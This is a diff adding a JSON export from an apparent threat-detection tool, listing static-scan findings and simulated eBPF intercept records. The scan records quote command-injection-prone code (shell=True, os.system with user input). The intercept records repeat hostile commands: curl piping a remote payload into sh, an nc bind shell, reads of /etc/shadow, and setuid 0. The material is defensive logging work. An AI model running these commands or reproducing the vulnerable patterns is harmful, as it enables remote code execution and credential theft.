@@ -1,0 +1,2845 @@
+{
+  "manifest": {
+    "tool": "Aegis Threat Archive Vault",
+    "compiled_posture": "LOCAL_PERSISTED_DATABASE",
+    "checksum_id": "SHA256_LOCAL_AEGIS_DB_V2",
+    "exported_timestamp_utc": "2026-09-23T04:28:05.037Z",
+    "total_archived_records_count": 142
+  },
+  "records": [
+    {
+      "id": "ast-vuln-Subprocess Shell Execution Enabled (shell=True)-11",
+      "timestamp": "2026-09-23T04:24:02.353Z",
+      "category": "ast",
+      "name": "Static Threat: Subprocess Shell Execution Enabled (shell=True)",
+      "severity": "high",
+      "details": "Static source scan identified validation vulnerability in source. Line 11: Setting shell=True bypasses argument isolation by creating a shell intermediary. This executes raw strings directly and invites shell metacharacter expansion attacks.",
+      "rawPayload": "proc = subprocess.Popen(\"ping -c 1 \" + addr, shell=True, stdout=subprocess.PIPE)",
+      "status": "Unresolved",
+      "notes": "Automatically archived during static code verification AST scan.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "line": 11,
+        "type": "Subprocess Shell Execution Enabled (shell=True)",
+        "desc": "Setting shell=True bypasses argument isolation by creating a shell intermediary. This executes raw strings directly and invites shell metacharacter expansion attacks."
+      }
+    },
+    {
+      "id": "ast-vuln-Insecure Command Execution (os.system)-7",
+      "timestamp": "2026-09-23T04:24:02.353Z",
+      "category": "ast",
+      "name": "Static Threat: Insecure Command Execution (os.system)",
+      "severity": "high",
+      "details": "Static source scan identified validation vulnerability in source. Line 7: Direct invocation of 'os.system()' processes commands via the default shell. This is extremely prone to command injection exploits. Use 'subprocess.run' with an explicit argument list instead.",
+      "rawPayload": "os.system(\"tar -czf site_bak.tar \" + user_supplied_dir)",
+      "status": "Unresolved",
+      "notes": "Automatically archived during static code verification AST scan.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "line": 7,
+        "type": "Insecure Command Execution (os.system)",
+        "desc": "Direct invocation of 'os.system()' processes commands via the default shell. This is extremely prone to command injection exploits. Use 'subprocess.run' with an explicit argument list instead."
+      }
+    },
+    {
+      "id": "0.5270287074251907",
+      "timestamp": "2026-09-23T04:23:52Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 16298, Parent PPID 714) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=714 pid=16298 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 16298,
+        "ppid": 714,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.27145079541188943",
+      "timestamp": "2026-09-23T04:23:52Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 30028, Parent PPID 323) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=323 pid=30028 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30028,
+        "ppid": 323,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.7867586843431964",
+      "timestamp": "2026-09-23T04:23:51Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 30922, Parent PPID 950) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=950 pid=30922 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30922,
+        "ppid": 950,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8758898455344742",
+      "timestamp": "2026-09-23T04:23:50Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 16487, Parent PPID 168) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=168 pid=16487 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 16487,
+        "ppid": 168,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.2185650770825831",
+      "timestamp": "2026-09-23T04:23:49Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 10837, Parent PPID 843) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=843 pid=10837 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 10837,
+        "ppid": 843,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.1771524126984031",
+      "timestamp": "2026-09-23T04:23:48Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 2665, Parent PPID 580) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=580 pid=2665 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 2665,
+        "ppid": 580,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.4214341679733262",
+      "timestamp": "2026-09-23T04:23:48Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 6740, Parent PPID 724) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=724 pid=6740 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 6740,
+        "ppid": 724,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.31134096259973965",
+      "timestamp": "2026-09-23T04:23:47Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 19246, Parent PPID 579) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=579 pid=19246 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 19246,
+        "ppid": 579,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8791609758012321",
+      "timestamp": "2026-09-23T04:23:46Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 6048, Parent PPID 620) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=620 pid=6048 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 6048,
+        "ppid": 620,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8646647946915673",
+      "timestamp": "2026-09-23T04:23:45Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 22098, Parent PPID 778) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=778 pid=22098 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22098,
+        "ppid": 778,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5330244683419983",
+      "timestamp": "2026-09-23T04:23:44Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 11850, Parent PPID 672) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=672 pid=11850 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 11850,
+        "ppid": 672,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.24880475284965553",
+      "timestamp": "2026-09-23T04:23:44Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 24265, Parent PPID 17) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=17 pid=24265 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 24265,
+        "ppid": 17,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.32650271161429734",
+      "timestamp": "2026-09-23T04:23:43Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 26751, Parent PPID 222) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=222 pid=26751 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 26751,
+        "ppid": 222,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.663319698245266",
+      "timestamp": "2026-09-23T04:23:42Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 7462, Parent PPID 393) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=393 pid=7462 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 7462,
+        "ppid": 393,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.303623064062874",
+      "timestamp": "2026-09-23T04:23:41Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 8236, Parent PPID 59) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=59 pid=8236 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 8236,
+        "ppid": 59,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.12937692214440166",
+      "timestamp": "2026-09-23T04:23:40Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 9283, Parent PPID 414) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=414 pid=9283 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 9283,
+        "ppid": 414,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.9858020737906549",
+      "timestamp": "2026-09-23T04:23:40Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 22845, Parent PPID 858) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=858 pid=22845 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22845,
+        "ppid": 858,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.4568931042097608",
+      "timestamp": "2026-09-23T04:23:39Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: epoll_wait on systemd",
+      "severity": "low",
+      "details": "Process 'systemd' (PID 3612, Parent PPID 602) executed system call 'epoll_wait' with args 'maxevents: 32'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=epoll_wait ppid=602 pid=3612 comm=systemd args=maxevents: 32 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 3612,
+        "ppid": 602,
+        "comm": "systemd",
+        "syscall": "epoll_wait",
+        "args": "maxevents: 32",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5514576977039879",
+      "timestamp": "2026-09-23T04:23:38Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 6925, Parent PPID 59) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=59 pid=6925 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 6925,
+        "ppid": 59,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.6726112452742198",
+      "timestamp": "2026-09-23T04:23:37Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 3852, Parent PPID 349) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=349 pid=3852 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 3852,
+        "ppid": 349,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5758814935309611",
+      "timestamp": "2026-09-23T04:23:36Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 11557, Parent PPID 779) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=779 pid=11557 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 11557,
+        "ppid": 779,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.49222791196092996",
+      "timestamp": "2026-09-23T04:23:36Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 1230, Parent PPID 516) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=516 pid=1230 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 1230,
+        "ppid": 516,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.10865962089820014",
+      "timestamp": "2026-09-23T04:23:35Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 24675, Parent PPID 596) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=596 pid=24675 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 24675,
+        "ppid": 596,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.27039155517272595",
+      "timestamp": "2026-09-23T04:23:34Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 15168, Parent PPID 529) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=529 pid=15168 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 15168,
+        "ppid": 529,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.758962686306514",
+      "timestamp": "2026-09-23T04:23:33Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 17957, Parent PPID 248) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=248 pid=17957 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 17957,
+        "ppid": 248,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.6419063729836427",
+      "timestamp": "2026-09-23T04:23:32Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 22217, Parent PPID 414) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=414 pid=22217 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22217,
+        "ppid": 414,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.21992558304365317",
+      "timestamp": "2026-09-23T04:23:32Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 10787, Parent PPID 596) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=596 pid=10787 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 10787,
+        "ppid": 596,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.9107478371326675",
+      "timestamp": "2026-09-23T04:23:31Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 11902, Parent PPID 647) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=647 pid=11902 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 11902,
+        "ppid": 647,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8683290584029641",
+      "timestamp": "2026-09-23T04:23:30Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: accept4 on nginx",
+      "severity": "low",
+      "details": "Process 'nginx' (PID 4902, Parent PPID 418) executed system call 'accept4' with args 'client: 192.168.1.55:53299'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=accept4 ppid=418 pid=4902 comm=nginx args=client: 192.168.1.55:53299 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 4902,
+        "ppid": 418,
+        "comm": "nginx",
+        "syscall": "accept4",
+        "args": "client: 192.168.1.55:53299",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5704226106969822",
+      "timestamp": "2026-09-23T04:23:29Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 3985, Parent PPID 722) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=722 pid=3985 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 3985,
+        "ppid": 722,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.36874427476128513",
+      "timestamp": "2026-09-23T04:23:28Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 16548, Parent PPID 975) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=975 pid=16548 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 16548,
+        "ppid": 975,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.06453969667053916",
+      "timestamp": "2026-09-23T04:23:28Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 15481, Parent PPID 48) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=48 pid=15481 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 15481,
+        "ppid": 48,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.09275805265234915",
+      "timestamp": "2026-09-23T04:23:27Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 20758, Parent PPID 717) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=717 pid=20758 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 20758,
+        "ppid": 717,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.23841022372703247",
+      "timestamp": "2026-09-23T04:23:26Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 26339, Parent PPID 456) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=456 pid=26339 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 26339,
+        "ppid": 456,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.833972282099764",
+      "timestamp": "2026-09-23T04:23:25Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 10033, Parent PPID 412) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=412 pid=10033 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 10033,
+        "ppid": 412,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.0648893256267038",
+      "timestamp": "2026-09-23T04:23:24Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 30693, Parent PPID 980) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=980 pid=30693 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30693,
+        "ppid": 980,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.20395962905742182",
+      "timestamp": "2026-09-23T04:23:24Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 8066, Parent PPID 637) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=637 pid=8066 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 8066,
